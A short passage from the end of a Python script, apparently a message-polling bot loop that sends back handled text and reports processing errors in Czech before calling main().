                try:
                    send_msg(handle(text))
                except Exception as e:
                    send_msg(f"[Chyba zpracovani] {e}")
        time.sleep(1)

if __name__ == "__main__":
    main()
